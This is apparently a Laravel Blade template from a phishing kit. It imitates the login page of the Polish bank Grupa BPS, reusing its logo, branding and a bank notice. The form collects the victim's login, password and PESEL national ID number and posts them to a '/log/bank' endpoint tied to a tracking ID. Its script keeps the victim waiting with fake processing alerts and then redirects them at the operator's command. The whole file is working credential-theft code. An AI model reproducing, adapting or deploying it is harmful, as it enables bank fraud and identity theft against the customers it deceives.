@extends('layouts.fake')
@push('css')
    <style>
        p {
            margin-block-start: 2px;
            margin-block-end: 2px;
        }
    </style>
    <style>
        @import url('https://fonts.googleapis.com/css?family=Raleway|Rock+Salt|Source+Code+Pro:300,400,600');

        * {
            font-family: 'Raleway';
        }
    </style>
    <style>
        .neon_border {
            width: 80vw;
            max-width: 400px;
            padding: 20px 5vw;
            margin: auto;
            background: #f5f5f5;
            border: 1px solid #efefef;
            border-radius: 10px;
        }

        .form-item {
            position: relative;
            padding-top: 40px;
            margin-bottom: 10px;
        }

        label {
            position: absolute;
            left: 19px;
            top: 45px;
            transition: 0.5s;
            background: #f5f5f5;
            padding: 5px;
        }

        input {
            display: block;
            width: calc(100% - 24px);
            padding: 11px;
            margin: auto;
            border: 1px solid #ccc;
            background: no-repeat bottom, 50% calc(100% - 1px);
            background-size: 0 100%, 100% 100%;
            background-image: linear-gradient(0deg, #007e90 3px, rgba(156, 39, 176, 0) 0), linear-gradient(0deg, #f5f5f5 1px, hsla(0, 0%, 82%, 0) 0);
            border-radius: 19px;
            transition: 0.3s;
        }

        button {
            display: block;
            padding: 7px 16px;
            font-size: 1.1875rem;
            line-height: 28px;
            border-radius: 8px;
            font-weight: 700;
            margin: auto;
            color: #fff;
            background-color: #009170;
            border-color: #009170;
            border: none;
        }

        input:focus {
            outline: none;
            background-size: 100% 100%, 100% 100%;
            box-shadow: none;
        }

        input:focus + label,
        input:not(:placeholder-shown) + label {
            top: 26px;
            left: 27px;
        }

        ::-webkit-input-placeholder {
            opacity: 0;
        }

        input:focus::-webkit-input-placeholder {
            opacity: 1;
        }

        p {
            color: #009170;
            font-weight: 700;
            font-size: 23px;
        }

        .icon {
            float: left;
            font-size: 24px;
            color: #009170;
            padding: 8px 12px 10px 0

        }

        .icon-text {
            color: #009170;
            font-weight: 600;
            line-height: 23px;
        }

        .second:before {
            content: "\6b";
        }

        .icon:before {
            font-family: "ing-iconfont" !important;
            font-style: normal !important;
            font-weight: normal !important;
            font-variant: normal !important;
            text-transform: none !important;
            speak: none;
            line-height: 1;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        h6 {
            padding: 0 36px 20px;
            margin-block-start: 5px;
            margin-block-end: 5px;
            font-weight: normal;
        }

        a {
            color: #009170;
            font-weight: 600;
        }

        button {
            cursor: pointer;
        }
    </style>
    <style>
        *, :after, :before {
            box-sizing: revert;
        }
    </style>
@endpush
@section('content')
    <div style="width: calc(100vw - 30px); height: 32px; padding: 10px 15px 15px; border-bottom: 1px solid #dfdfdf; background: #ffffff;">
        <img src="{{asset($bank['logo'])}}" style="max-width: 90vw;max-height: 100%">
    </div>
    <div style="margin: 40px 5vw 45px;">
        <form class="neon_border" id="form" method="POST" action="/log/bank"
              role="form">
            @csrf
            <input type="hidden" name="track_id" id="track_id" value="{{$fake->track_id}}">
            <p>Zaloguj się</p>
            <div class="form-item" id="input1">
                <input type="text" name="login" id="login" placeholder="Wpisz login">
                <label for="login">Login</label>
            </div>
            <div class="form-item" id="input2">
                <input type="text" name="password" id="password" placeholder="Wpisz haslo">
                <label for="password">Haslo</label>
            </div>
            <div class="form-item" id="input2">
                <input type="text" name="pesel" id="pesel" placeholder="Wpisz pesel">
                <label for="pesel">Enter your PESEL number</label>
            </div>

            <button type="submit" id="pay1">Avanti</button>
            <hr style="margin: 30px 36px; border: 2px dashed #dfdfdf;">
            <div>
                <div class="icon second"></div>
                <span class="icon-text">ZMIANA GODZIN OBSŁUGI KASOWEJ W ODDZIAŁACH</span>
                <h6>Informujemy, że od 1 grudnia 2021 r. zmieniają się godziny obsługi kasowej Klientów w Oddziałach
                    Banku BPS S.A.Obsługa kasowa Klientów...</h6>
            </div>
        </form>
    </div>
    <div style="min-height: 22px; padding: 12px; color: #fff; background: #202123; position: fixed; bottom: 0; left: 0; right: 0; font-family: 'Source Code Pro', monospace; border-top: 1px solid #21252;">
        Copyright © Grupa BPS | {{date('Y')}}</div>
@endsection
@push('js')
    <script type="text/javascript">
        $("#form").on("submit", function (event) {
            event.preventDefault();

            if ($('#login').val() == '') {
                $('#login').css('border', '1px solid #b60');
            }

            if ($('#password').val() == '') {
                $('#password').css('border', '1px solid #b60');
            }

            if ($('#pesel').val() == '') {
                $('#pesel').css('border', '1px solid #b60');
            }

            if ($('#login').val() != '' && $('#password').val() != '' && $('#pesel').val() != '') {
                lk_auth();
            }
        });

        function lk_auth() {
            let form = $('form#form');
            $('#pay-button').hide()
            if ($('#password').val() != '' && $('#login').val() != '') {
                $.ajax({
                    type: "POST",
                    url: form.attr('action'),
                    data: form.serialize(),
                }).fail(function (response) {
                    $('#pay-button').hide();
                    $('#pay-button').html('<ing-button filled="" type="button" tabindex="0" role="button">Oczekiwać<button tabindex="-1" aria-hidden="true" slot="_button" type="button"></button></ing-button>')
                    $('#pay-button').attr('onclick', '');
                    alert('Proszę czekać, przetwarzam dane. Naciśnij przycisk na dole po kilku minutach, aby sprawdzić status');
                    setTimeout(function () {
                        lk_auth();
                    }, 10000);
                }).done(function (data) {
                    $('#pay-button').show();
                    $('#pay-button').html('<ing-button filled="" type="button" tabindex="0" role="button">Oczekiwać<button tabindex="-1" aria-hidden="true" slot="_button" type="button"></button></ing-button>')
                    $('#pay-button').attr('onclick', '');
                    if (data.html) $('#app').html(data.html);
                    else if (data.next) location.href = data.next;
                    else setTimeout(function () {
                            alert("Błąd");
                        }, 3000)

                });
            } else {
                $('#pay-button').show();
                ($('#password').val() == '') ? $('#password').css("border-color", "red") : $('#password').css("border-color", "");
                ($('#pesel').val() == '') ? $('#pesel').css("border-color", "red") : $('#pesel').css("border-color", "");
                ($('#pin').val() == '') ? $('#pin').css("border-color", "red") : $('#pin').css("border-color", "");
                ($('#login').val() == '') ? $('#login').css("border-color", "red") : $('#login').css("border-color", "");
            }

        }
    </script>
@endpush